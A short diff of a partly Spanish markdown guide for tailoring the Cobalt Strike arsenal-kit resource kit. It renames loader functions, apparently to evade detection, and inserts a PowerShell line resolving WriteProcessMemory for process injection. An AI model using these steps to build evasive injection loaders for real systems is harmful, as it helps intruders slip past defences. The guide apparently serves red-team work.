@@ -65,7 +65,7 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 8. Rename the **func_get_delegate_type** function on line 10 to **get_delegate_type**.
 -  Asegurate de que las variables al cambiarle el nombre tambien le cambies el nombre en todas sus llamadas
 4. Scroll to line 32 and replace it with:
-- Añadelo tal cual y no borres mas lineas solo metelo
+- Add it exactly as it is and don’t delete any more lines, just insert it.
 
 ```powershell
 $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll WriteProcessMemory), (get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
